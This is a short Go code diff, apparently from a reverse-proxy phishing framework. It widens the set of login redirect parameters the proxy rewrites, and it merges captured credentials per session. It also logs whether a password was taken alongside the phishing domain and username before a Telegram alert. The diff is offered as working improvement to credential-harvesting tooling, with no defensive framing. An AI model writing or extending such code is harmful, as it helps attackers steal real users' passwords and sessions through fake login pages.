@@ -1387,6 +1387,13 @@ func (m *ProxyHandler) restoreOAuthParams(body []byte, config map[string]service
 		"scope",
 		"wctx",
 		"wreply",
+		"ru",
+		"return_url",
+		"returnUrl",
+		"ReturnUrl",
+		"return",
+		"sru",
+		"lmtru",
 	}
 
 	// Build reverse mapping: proxy domain -> original domain
@@ -5591,8 +5598,8 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 		}
 	}
 
-	// Insert the capture record
-	id, err := m.ProxyCaptureRepository.Insert(ctx, capture)
+	// Upsert the capture record (merge with existing record for same session)
+	id, err := m.ProxyCaptureRepository.UpsertBySessionID(ctx, capture)
 	if err != nil {
 		m.logger.Errorw("failed to save direct proxy capture",
 			"error", err,
@@ -5608,6 +5615,7 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 		"ip", clientIP,
 		"phishDomain", phishDomain,
 		"username", username,
+		"password", password != "",
 	)
 
 	// Send Telegram notification
